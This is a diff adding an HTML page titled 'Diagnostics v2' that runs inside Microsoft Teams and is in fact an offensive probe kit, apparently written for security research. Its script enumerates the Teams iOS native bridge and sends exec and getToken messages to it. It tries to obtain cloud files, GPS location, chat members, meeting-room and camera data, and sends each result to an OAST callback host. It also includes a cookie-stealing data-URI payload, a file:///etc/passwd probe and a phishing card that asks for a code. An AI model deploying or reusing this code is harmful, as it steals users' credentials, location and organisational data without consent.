@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Diagnostics v2</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Cascadia Code','SF Mono',monospace; background:#0d1117; color:#c9d1d9; padding:8px; font-size:11px; }
+  #out { background:#161b22; padding:8px; border-radius:6px; white-space:pre-wrap; word-break:break-all; max-height:85vh; overflow-y:auto; }
+  .ok { color:#3fb950; } .fail { color:#f85149; } .warn { color:#d29922; } .info { color:#58a6ff; } .crit { color:#f0883e; font-weight:bold; }
+  button { background:#21262d; color:#58a6ff; border:1px solid #30363d; padding:6px 12px; margin:2px; border-radius:4px; cursor:pointer; font-size:11px; }
+</style>
+</head>
+<body>
+<div style="margin-bottom:8px;">
+  <button onclick="runAll()">Run All</button>
+  <button onclick="probeNativeBridge()">Native Bridge</button>
+  <button onclick="probeFiles()">Files API</button>
+  <button onclick="probeLocation()">Location</button>
+  <button onclick="probeConversations()">Conversations</button>
+  <button onclick="probeMeetingRoom()">MeetingRoom</button>
+  <button onclick="probeRemoteCamera()">RemoteCamera</button>
+  <button onclick="probeDialogSelf()">Dialog→Self</button>
+  <button onclick="copyOut()">Copy</button>
+</div>
+<div id="out"></div>
+
+<script>
+var el = document.getElementById('out');
+var CTX = null;
+var C = 'o21c1mes8ezi4ox5wz9mmhhpikwlgcwi8.oast.site';
+
+function log(m, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = m + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function ex(path, data) {
+  var p = Object.keys(data).map(function(k) {
+    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 400));
+  }).join('&');
+  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
+    new Image().src = 'https://' + C + '/' + path + '?' + p;
+  });
+}
+
+function copyOut() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+  log('[copied]', 'info');
+}
+
+function safeStringify(obj, depth) {
+  if (depth === undefined) depth = 3;
+  if (depth <= 0) return String(obj);
+  if (obj === null) return 'null';
+  if (obj === undefined) return 'undefined';
+  var type = typeof obj;
+  if (type === 'string') return '"' + obj.substring(0, 200) + '"';
+  if (type === 'number' || type === 'boolean') return String(obj);
+  if (type === 'function') return '[function ' + (obj.name || 'anon') + ']';
+  if (Array.isArray(obj)) {
+    return '[' + obj.slice(0, 10).map(function(v) { return safeStringify(v, depth - 1); }).join(', ') + ']';
+  }
+  if (type === 'object') {
+    var keys;
+    try { keys = Object.getOwnPropertyNames(obj); } catch(e) { try { keys = Object.keys(obj); } catch(e2) { return '[object]'; } }
+    var parts = keys.slice(0, 20).map(function(k) {
+      try { return k + ': ' + safeStringify(obj[k], depth - 1); } catch(e) { return k + ': [error]'; }
+    });
+    return '{' + parts.join(', ') + '}';
+  }
+  return String(obj);
+}
+
+async function init() {
+  log('=== INIT ===', 'info');
+  try {
+    await microsoftTeams.app.initialize();
+    CTX = await microsoftTeams.app.getContext();
+    log('SDK OK: ' + CTX.user.userPrincipalName + ' | ' + CTX.app.host.clientType, 'ok');
+  } catch(e) {
+    log('SDK init: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// PROBE 1: DEEP ENUMERATION OF window.teams NATIVE BRIDGE
+// This is the most critical finding — native object injected by Teams iOS
+// ================================================================
+async function probeNativeBridge() {
+  log('\n' + '='.repeat(60), 'info');
+  log('PROBE 1: window.teams NATIVE BRIDGE — DEEP ENUMERATION', 'info');
+  log('='.repeat(60), 'info');
+
+  // A) Deep enumerate window.teams
+  log('\n--- A: window.teams structure ---', 'info');
+  if (!window.teams) {
+    log('window.teams not found (requires Teams iOS)', 'fail');
+    return;
+  }
+
+  log('typeof window.teams: ' + typeof window.teams, 'ok');
+
+  // Get all properties recursively
+  function enumerate(obj, prefix, depth) {
+    if (depth > 4) return;
+    var keys;
+    try { keys = Object.getOwnPropertyNames(obj); } catch(e) {
+      try { keys = Object.keys(obj); } catch(e2) { return; }
+    }
+
+    for (var i = 0; i < keys.length; i++) {
+      var k = keys[i];
+      if (k === '__proto__' || k === 'constructor') continue;
+      var path = prefix + '.' + k;
+      try {
+        var val = obj[k];
+        var type = typeof val;
+
+        if (type === 'function') {
+          log('  ' + path + '() [function]', 'crit');
+          // Try calling with no args
+          try {
+            var result = val.call(obj);
+            if (result && typeof result.then === 'function') {
+              result = await Promise.race([result, new Promise(function(r) { setTimeout(function() { r('timeout'); }, 3000); })]);
+            }
+            log('    → returned: ' + safeStringify(result, 2).substring(0, 200), 'warn');
+            ex('t11-bridge-func', { path: path, result: safeStringify(result, 2).substring(0, 300) });
+          } catch(e) {
+            log('    → error: ' + e.message.substring(0, 80), 'info');
+          }
+        } else if (type === 'object' && val !== null) {
+          log('  ' + path + ' [object]', 'ok');
+          enumerate(val, path, depth + 1);
+        } else {
+          log('  ' + path + ' = ' + String(val).substring(0, 100) + ' (' + type + ')', 'ok');
+          if (String(val).length > 0 && type === 'string') {
+            ex('t11-bridge-val', { path: path, value: String(val).substring(0, 300) });
+          }
+        }
+      } catch(e) {
+        log('  ' + path + ': access error: ' + e.message.substring(0, 40), 'fail');
+      }
+    }
+  }
+
+  enumerate(window.teams, 'teams', 0);
+
+  // B) window.teams.messageHandlers — deep dive
+  log('\n--- B: window.teams.messageHandlers ---', 'info');
+  if (window.teams.messageHandlers) {
+    log('typeof: ' + typeof window.teams.messageHandlers, 'ok');
+    enumerate(window.teams.messageHandlers, 'teams.messageHandlers', 0);
+
+    // Try known handler patterns from Teams iOS
+    var handlerProbes = [
+      { name: 'auth', msgs: [
+        { action: 'getToken' },
+        { action: 'getToken', resource: 'https://graph.microsoft.com' },
+        { action: 'getSSOToken' },
+        { type: 'auth', method: 'getToken' },
+        'getToken',
+      ]},
+      { name: 'bridge', msgs: [
+        { action: 'version' },
+        { action: 'getDeviceInfo' },
+        { action: 'getCapabilities' },
+        { type: 'request', method: 'getInfo' },
+        'ping',
+      ]},
+      { name: 'native', msgs: [
+        { action: 'exec', command: 'id' },
+        { action: 'openURL', url: 'file:///etc/hosts' },
+        { action: 'readFile', path: '/tmp/test' },
+        { action: 'eval', code: 'test' },
+      ]},
+    ];
+
+    // Try posting to it directly if it has postMessage
+    if (typeof window.teams.messageHandlers.postMessage === 'function') {
+      log('\nteams.messageHandlers.postMessage EXISTS!', 'crit');
+      for (var hp of handlerProbes) {
+        for (var msg of hp.msgs) {
+          try {
+            var r = window.teams.messageHandlers.postMessage(msg);
+            log('  postMessage(' + JSON.stringify(msg).substring(0, 60) + '): OK', 'crit');
+            if (r !== undefined) log('    → ' + safeStringify(r, 2).substring(0, 150), 'warn');
+          } catch(e) {
+            log('  postMessage(' + JSON.stringify(msg).substring(0, 40) + '): ' + e.message.substring(0, 50), 'fail');
+          }
+        }
+      }
+    }
+
+    // Try each sub-handler
+    try {
+      var mhKeys = Object.getOwnPropertyNames(window.teams.messageHandlers);
+      for (var mk of mhKeys) {
+        var handler = window.teams.messageHandlers[mk];
+        if (handler && typeof handler.postMessage === 'function') {
+          log('\nFound sub-handler: teams.messageHandlers.' + mk, 'crit');
+          try {
+            handler.postMessage({ action: 'getToken' });
+            log('  → postMessage accepted!', 'crit');
+          } catch(e) {
+            log('  → postMessage error: ' + e.message.substring(0, 50), 'warn');
+          }
+        }
+      }
+    } catch(e) {}
+  }
+
+  // C) Check window.webkit.messageHandlers with Proxy trap
+  log('\n--- C: webkit.messageHandlers via property access ---', 'info');
+  if (window.webkit && window.webkit.messageHandlers) {
+    // Try getting the prototype chain
+    try {
+      var proto = Object.getPrototypeOf(window.webkit.messageHandlers);
+      if (proto) {
+        var protoKeys = Object.getOwnPropertyNames(proto);
+        log('Prototype keys: ' + protoKeys.join(', '), protoKeys.length > 0 ? 'crit' : 'info');
+      }
+    } catch(e) {}
+
+    // The handlers may be lazily created — try accessing known names
+    var iosHandlers = [
+      'TeamsNative', 'teamsAuth', 'teamsSSO', 'nativeInterface',
+      'jsbridge', 'callHandler', 'log', 'telemetry',
+      'performanceHandler', 'nativeBridge', 'messageBridge',
+      'appBridge', 'teams', 'auth', 'token', 'sso',
+      'shareExtension', 'notificationBridge', 'pushNotification',
+      'corsProxy', 'httpClient', 'networkRequest', 'fetch',
+      'keychain', 'secureStore', 'biometric',
+      'fileAccess', 'localStorage', 'userDefaults',
+      'deviceInfo', 'appInfo', 'systemInfo',
+      'deepLink', 'universalLink', 'urlScheme',
+      'camera', 'microphone', 'photo', 'contacts', 'calendar',
+    ];
+
+    for (var ih of iosHandlers) {
+      try {
+        var h = window.webkit.messageHandlers[ih];
+        if (h) {
+          log('  webkit.messageHandlers.' + ih + ' EXISTS!', 'crit');
+          try {
+            h.postMessage('ping');
+            log('    → postMessage accepted', 'crit');
+          } catch(e) {
+            log('    → ' + e.message.substring(0, 40), 'warn');
+          }
+          ex('t11-webkit-handler', { name: ih });
+        }
+      } catch(e) {}
+    }
+  }
+
+  // D) Check for other native injection points
+  log('\n--- D: Other native globals ---', 'info');
+  var globals = [
+    'nativeModule', 'NativeModules', '__turboModuleProxy',
+    '__fbBatchedBridge', '__fbGenNativeModule', 'ErrorUtils',
+    'nativeCallSyncHook', 'nativeFlushQueueImmediate',
+    'nativeLoggingHook', 'nativePerformanceNow',
+    'nativeTraceBeginSection', 'nativeTraceEndSection',
+    '__DEV__', '__BUNDLE_START_TIME__',
+    'HermesInternal', '_WORKLET_RUNTIME',
+    'expo', 'ExpoModules',
+    'TeamsMobileNative', 'TeamsBridge',
+    'MSALNative', 'OneAuthNative',
+    'IntuneMAMNative', 'MAMBridge',
+  ];
+
+  for (var g of globals) {
+    try {
+      if (window[g] !== undefined) {
+        log('  window.' + g + ' = ' + safeStringify(window[g], 1).substring(0, 150), 'crit');
+        ex('t11-global', { name: g, type: typeof window[g] });
+      }
+    } catch(e) {}
+  }
+
+  ex('t11-bridge-complete', { teamsExists: !!window.teams, teamsType: typeof window.teams });
+}
+
+// ================================================================
+// PROBE 2: FILES API — Access victim's cloud storage
+// 18 methods, no isSupported check visible — may work silently
+// ================================================================
+async function probeFiles() {
+  log('\n' + '='.repeat(60), 'info');
+  log('PROBE 2: FILES API — CLOUD STORAGE ACCESS', 'info');
+  log('='.repeat(60), 'info');
+
+  // A) Check if files module works
+  log('\n--- A: getCloudStorageFolders ---', 'info');
+  try {
+    // Try different channel IDs
+    var channelId = CTX && CTX.channel ? CTX.channel.id : '19:test@thread.tacv2';
+    microsoftTeams.files.getCloudStorageFolders(channelId, function(err, folders) {
+      if (err) {
+        log('getCloudStorageFolders error: ' + (err.message || JSON.stringify(err)), 'fail');
+      } else {
+        log('FOLDERS RETRIEVED: ' + JSON.stringify(folders).substring(0, 500), 'crit');
+        ex('t11-files-folders', { data: JSON.stringify(folders).substring(0, 400) });
+      }
+    });
+    log('getCloudStorageFolders called...', 'ok');
+  } catch(e) {
+    log('getCloudStorageFolders: ' + e.message, 'fail');
+  }
+
+  // B) Get external providers (OneDrive, SharePoint, etc.)
+  log('\n--- B: getExternalProviders ---', 'info');
+  try {
+    microsoftTeams.files.getExternalProviders(function(err, providers) {
+      if (err) {
+        log('getExternalProviders error: ' + (err.message || JSON.stringify(err)), 'fail');
+      } else {
+        log('PROVIDERS: ' + JSON.stringify(providers).substring(0, 500), 'crit');
+        ex('t11-files-providers', { data: JSON.stringify(providers).substring(0, 400) });
+      }
+    });
+    log('getExternalProviders called...', 'ok');
+  } catch(e) {
+    log('getExternalProviders: ' + e.message, 'fail');
+  }
+
+  // C) Get file downloads
+  log('\n--- C: getFileDownloads ---', 'info');
+  try {
+    microsoftTeams.files.getFileDownloads(function(err, downloads) {
+      if (err) {
+        log('getFileDownloads error: ' + (err.message || JSON.stringify(err)), 'fail');
+      } else {
+        log('DOWNLOADS: ' + JSON.stringify(downloads).substring(0, 500), 'crit');
+        ex('t11-files-downloads', { data: JSON.stringify(downloads).substring(0, 400) });
+      }
+    });
+    log('getFileDownloads called...', 'ok');
+  } catch(e) {
+    log('getFileDownloads: ' + e.message, 'fail');
+  }
+
+  await new Promise(function(r) { setTimeout(r, 5000); });
+}
+
+// ================================================================
+// PROBE 3: SILENT LOCATION THEFT
+// location.isSupported() = true — get GPS without user prompt?
+// ================================================================
+async function probeLocation() {
+  log('\n' + '='.repeat(60), 'info');
+  log('PROBE 3: SILENT LOCATION THEFT', 'info');
+  log('='.repeat(60), 'info');
+
+  // A) Check permission first
+  log('\n--- A: Check location permission ---', 'info');
+  try {
+    if (microsoftTeams.geoLocation && microsoftTeams.geoLocation.isSupported()) {
+      log('geoLocation.isSupported() = true', 'ok');
+      try {
+        var hasPerm = await microsoftTeams.geoLocation.hasPermission();
+        log('hasPermission: ' + hasPerm, hasPerm ? 'crit' : 'warn');
+      } catch(e) {
+        log('hasPermission error: ' + e.message, 'fail');
+      }
+    }
+  } catch(e) {}
+
+  // B) Try old location API (location.getLocation)
+  log('\n--- B: location.getLocation ---', 'info');
+  try {
+    if (microsoftTeams.location && microsoftTeams.location.isSupported()) {
+      log('location.isSupported() = true', 'ok');
+
+      microsoftTeams.location.getLocation(
+        { allowChooseLocation: false, showMap: false },
+        function(err, loc) {
+          if (err) {
+            log('getLocation error: ' + (err.message || err.errorCode || JSON.stringify(err)), 'fail');
+          } else {
+            log('LOCATION OBTAINED!', 'crit');
+            log('  Lat: ' + loc.latitude, 'crit');
+            log('  Lon: ' + loc.longitude, 'crit');
+            log('  Accuracy: ' + loc.accuracy, 'ok');
+            ex('t11-location', { lat: loc.latitude, lon: loc.longitude, accuracy: loc.accuracy });
+          }
+        }
+      );
+      log('getLocation called (waiting for callback)...', 'ok');
+    }
+  } catch(e) {
+    log('getLocation: ' + e.message, 'fail');
+  }
+
+  // C) Try native geolocation API (WKWebView might allow it)
+  log('\n--- C: navigator.geolocation ---', 'info');
+  try {
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        log('NATIVE GEOLOCATION!', 'crit');
+        log('  Lat: ' + pos.coords.latitude, 'crit');
+        log('  Lon: ' + pos.coords.longitude, 'crit');
+        ex('t11-native-geo', { lat: pos.coords.latitude, lon: pos.coords.longitude });
+      },
+      function(err) {
+        log('Native geo error: ' + err.message, 'fail');
+      },
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+    log('getCurrentPosition called...', 'ok');
+  } catch(e) {
+    log('navigator.geolocation: ' + e.message, 'fail');
+  }
+
+  await new Promise(function(r) { setTimeout(r, 8000); });
+}
+
+// ================================================================
+// PROBE 4: CONVERSATIONS — CHAT MEMBER EXFILTRATION
+// conversations.isSupported() = true
+// ================================================================
+async function probeConversations() {
+  log('\n' + '='.repeat(60), 'info');
+  log('PROBE 4: CONVERSATIONS — MEMBER EXFILTRATION', 'info');
+  log('='.repeat(60), 'info');
+
+  // A) getChatMembers
+  log('\n--- A: getChatMembers ---', 'info');
+  try {
+    microsoftTeams.conversations.getChatMembers(function(err, members) {
+      if (err) {
+        log('getChatMembers error: ' + (err.message || JSON.stringify(err)), 'fail');
+      } else {
+        log('CHAT MEMBERS RETRIEVED!', 'crit');
+        log(JSON.stringify(members).substring(0, 800), 'warn');
+        ex('t11-chat-members', { data: JSON.stringify(members).substring(0, 400) });
+      }
+    });
+    log('getChatMembers called...', 'ok');
+  } catch(e) {
+    log('getChatMembers: ' + e.message, 'fail');
+  }
+
+  // B) Try openConversation to probe data
+  log('\n--- B: conversations module methods ---', 'info');
+  try {
+    var methods = Object.getOwnPropertyNames(microsoftTeams.conversations).filter(function(k) {
+      return typeof microsoftTeams.conversations[k] === 'function';
+    });
+    log('Available methods: ' + methods.join(', '), 'ok');
+  } catch(e) {}
+
+  // C) people.selectPeople — data exfiltration via org directory
+  log('\n--- C: people.selectPeople ---', 'info');
+  try {
+    if (microsoftTeams.people && microsoftTeams.people.isSupported()) {
+      log('people.isSupported() = true', 'ok');
+    }
+  } catch(e) {}
+
+  await new Promise(function(r) { setTimeout(r, 5000); });
+}
+
+// ================================================================
+// PROBE 5: MEETING ROOM — PHYSICAL DEVICE CONTROL
+// meetingRoom.isSupported() = true
+// ================================================================
+async function probeMeetingRoom() {
+  log('\n' + '='.repeat(60), 'info');
+  log('PROBE 5: MEETING ROOM — PHYSICAL DEVICE CONTROL', 'info');
+  log('='.repeat(60), 'info');
+
+  log('\n--- A: getPairedMeetingRoomInfo ---', 'info');
+  try {
+    microsoftTeams.meetingRoom.getPairedMeetingRoomInfo(function(err, info) {
+      if (err) {
+        log('getPairedMeetingRoomInfo error: ' + (err.message || JSON.stringify(err)), 'fail');
+      } else {
+        log('MEETING ROOM INFO!', 'crit');
+        log(JSON.stringify(info).substring(0, 500), 'warn');
+        ex('t11-meetingroom', { data: JSON.stringify(info).substring(0, 400) });
+      }
+    });
+    log('getPairedMeetingRoomInfo called...', 'ok');
+  } catch(e) {
+    log('getPairedMeetingRoomInfo: ' + e.message, 'fail');
+  }
+
+  log('\n--- B: sendCommandToPairedMeetingRoom ---', 'info');
+  try {
+    // Try various commands
+    var commands = [
+      'cycleCamera', 'toggleMute', 'toggleVideo',
+      'volumeUp', 'volumeDown', 'toggleShare',
+    ];
+    for (var cmd of commands) {
+      try {
+        microsoftTeams.meetingRoom.sendCommandToPairedMeetingRoom(cmd, function(err) {
+          if (err) {
+            log('  sendCommand(' + cmd + '): ' + (err.message || JSON.stringify(err)), 'fail');
+          } else {
+            log('  sendCommand(' + cmd + '): ACCEPTED!', 'crit');
+          }
+        });
+        log('  sendCommand(' + cmd + ') called', 'ok');
+      } catch(e) {
+        log('  sendCommand(' + cmd + '): ' + e.message, 'fail');
+      }
+    }
+  } catch(e) {
+    log('sendCommand: ' + e.message, 'fail');
+  }
+
+  await new Promise(function(r) { setTimeout(r, 3000); });
+}
+
+// ================================================================
+// PROBE 6: REMOTE CAMERA CONTROL
+// remoteCamera.isSupported() = true — can control other participants' cameras
+// ================================================================
+async function probeRemoteCamera() {
+  log('\n' + '='.repeat(60), 'info');
+  log('PROBE 6: REMOTE CAMERA CONTROL', 'info');
+  log('='.repeat(60), 'info');
+
+  log('\n--- A: getCapableParticipants ---', 'info');
+  try {
+    microsoftTeams.remoteCamera.getCapableParticipants(function(err, participants) {
+      if (err) {
+        log('getCapableParticipants error: ' + (err.message || JSON.stringify(err)), 'fail');
+      } else {
+        log('CAPABLE PARTICIPANTS!', 'crit');
+        log(JSON.stringify(participants).substring(0, 500), 'warn');
+        ex('t11-remotecam', { data: JSON.stringify(participants).substring(0, 400) });
+      }
+    });
+    log('getCapableParticipants called...', 'ok');
+  } catch(e) {
+    log('getCapableParticipants: ' + e.message, 'fail');
+  }
+
+  await new Promise(function(r) { setTimeout(r, 3000); });
+}
+
+// ================================================================
+// PROBE 7: DIALOG → SELF — EXFILTRATE DIALOG CONTEXT
+// dialog.isSupported() = true — open dialog that loads our own URL
+// The dialog runs in a DIFFERENT security context?
+// ================================================================
+async function probeDialogSelf() {
+  log('\n' + '='.repeat(60), 'info');
+  log('PROBE 7: DIALOG CONTEXT PROBE', 'info');
+  log('='.repeat(60), 'info');
+
+  // A) Open dialog that loads our exfil URL
+  log('\n--- A: dialog.url.open → OAST ---', 'info');
+  try {
+    if (microsoftTeams.dialog && microsoftTeams.dialog.url && microsoftTeams.dialog.url.open) {
+      // Open our own URL in dialog — it gets a DIFFERENT context
+      var dialogUrl = window.location.href.split('?')[0] + '?mode=dialog';
+      microsoftTeams.dialog.url.open({
+        title: 'Loading...',
+        url: 'https://' + C + '/dialog-probe?upn=' + encodeURIComponent(CTX ? CTX.user.userPrincipalName : 'unknown'),
+        size: { height: 200, width: 300 }
+      }, function(result) {
+        log('Dialog result: ' + safeStringify(result, 2).substring(0, 300), 'warn');
+        if (result && result.result) {
+          ex('t11-dialog-result', { data: safeStringify(result.result, 2).substring(0, 400) });
+        }
+      });
+      log('Dialog opened to OAST (check for callbacks)', 'ok');
+    } else {
+      log('dialog.url.open not available', 'fail');
+    }
+  } catch(e) {
+    log('dialog.url.open: ' + e.message, 'fail');
+  }
+
+  // B) Try dialog.url.open with file:// URL
+  log('\n--- B: dialog with file:// URL ---', 'info');
+  try {
+    microsoftTeams.dialog.url.open({
+      title: 'Settings',
+      url: 'file:///etc/passwd',
+      size: { height: 200, width: 300 }
+    }, function(result) {
+      log('file:// dialog result: ' + safeStringify(result, 2).substring(0, 200), 'crit');
+    });
+    log('file:// dialog called', 'ok');
+  } catch(e) {
+    log('file:// dialog: ' + e.message, 'fail');
+  }
+
+  // C) Try dialog.url.open with data: URI (XSS)
+  log('\n--- C: dialog with data: URI ---', 'info');
+  try {
+    var dataUri = 'data:text/html;base64,' + btoa('<script>fetch("https://' + C + '/dialog-xss?cookie="+document.cookie+"&origin="+location.origin)<\/script>');
+    microsoftTeams.dialog.url.open({
+      title: 'Update',
+      url: dataUri,
+      size: { height: 200, width: 300 }
+    }, function(result) {
+      log('data: dialog result: ' + safeStringify(result, 2).substring(0, 200), 'crit');
+    });
+    log('data: URI dialog called', 'ok');
+  } catch(e) {
+    log('data: dialog: ' + e.message, 'fail');
+  }
+
+  // D) Try dialog.url.open with javascript: URI
+  log('\n--- D: dialog with javascript: URI ---', 'info');
+  try {
+    microsoftTeams.dialog.url.open({
+      title: 'Help',
+      url: 'javascript:void(fetch("https://' + C + '/dialog-js?origin="+location.origin))',
+      size: { height: 200, width: 300 }
+    }, function(result) {
+      log('javascript: dialog result: ' + safeStringify(result, 2).substring(0, 200), 'crit');
+    });
+    log('javascript: URI dialog called', 'ok');
+  } catch(e) {
+    log('javascript: dialog: ' + e.message, 'fail');
+  }
+
+  // E) AdaptiveCard dialog — exfil via action
+  log('\n--- E: adaptiveCard dialog ---', 'info');
+  try {
+    if (microsoftTeams.dialog && microsoftTeams.dialog.adaptiveCard) {
+      microsoftTeams.dialog.adaptiveCard.open({
+        title: 'Verify',
+        card: JSON.stringify({
+          type: 'AdaptiveCard',
+          version: '1.5',
+          body: [
+            { type: 'TextBlock', text: 'Session verification required.', weight: 'Bolder' },
+            { type: 'Input.Text', id: 'token', placeholder: 'Paste verification code', style: 'password' },
+          ],
+          actions: [{ type: 'Action.Submit', title: 'Verify', style: 'positive' }]
+        })
+      }, function(result) {
+        if (result && result.result) {
+          log('AdaptiveCard data: ' + JSON.stringify(result.result), 'crit');
+          ex('t11-adaptive-capture', { data: JSON.stringify(result.result).substring(0, 300) });
+        }
+      });
+      log('AdaptiveCard dialog opened', 'ok');
+    }
+  } catch(e) {
+    log('adaptiveCard: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// RUN ALL
+// ================================================================
+async function runAll() {
+  el.textContent = '';
+  await init();
+  await probeNativeBridge();
+  await probeFiles();
+  await probeLocation();
+  await probeConversations();
+  await probeMeetingRoom();
+  await probeRemoteCamera();
+  await probeDialogSelf();
+  log('\n' + '='.repeat(60), 'info');
+  log('ALL PROBES COMPLETE — copy output and send', 'info');
+  log('='.repeat(60), 'info');
+}
+
+init();
+</script>
+</body>
+</html>
